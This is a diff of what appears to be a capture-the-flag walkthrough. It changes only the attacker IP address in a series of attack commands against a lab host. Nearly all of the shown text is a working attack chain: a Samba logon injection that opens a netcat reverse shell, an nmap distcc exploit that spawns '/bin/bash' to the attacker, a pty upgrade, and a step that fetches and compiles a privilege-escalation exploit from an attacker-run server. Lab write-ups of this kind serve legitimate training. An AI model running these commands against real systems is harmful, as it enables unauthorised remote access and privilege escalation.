@@ -40,7 +40,7 @@ nc -nlvp 4444
 smbclient //10.10.10.3/tmp
 ```
 ```
-logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
+logon "/=`nohup nc -nv 10.10.14.20 4444 -e /bin/sh`"
 ```
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")' 
@@ -51,7 +51,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 nc -nlvp 4444
 ```
 ```
-nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.6 4444 -e /bin/bash'"
+nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.20 4444 -e /bin/bash'"
 ```
 ```
 searchsploit -m 8572.c
@@ -60,7 +60,7 @@ searchsploit -m 8572.c
 python -m SimpleHTTPServer 9005
 ```
 ```
-wget http://10.10.14.6:5555/8572.c
+wget http://10.10.14.20:5555/8572.c
 ```
 ```
 gcc 8572.c -o 8572  
